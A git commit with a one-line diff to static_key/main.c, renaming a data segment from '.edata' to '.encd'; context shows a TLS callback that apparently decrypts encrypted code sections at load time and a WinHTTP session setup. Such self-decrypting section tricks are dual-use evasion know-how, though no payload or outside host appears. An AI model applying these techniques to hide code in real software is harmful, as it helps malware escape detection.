74af15e057727fae98528f52684cfec01950aea7
frank2 <frank2@dc949.org>
2024-12-04 15:21:10 -0800

    try encd

--- static_key/main.c
+++ static_key/main.c
@@ -174,7 +174,7 @@ const PIMAGE_TLS_CALLBACK decrypt_callback = decrypt_sheep;
 #pragma const_seg(pop, c1)
 
 #pragma code_seg(push, r1, ".etext")
-#pragma data_seg(push, d1, ".edata")
+#pragma data_seg(push, d1, ".encd")
 HINTERNET init_winhttp(void) {
    return WinHttpOpen(L"Amethyst Labs/1.0",
                       WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
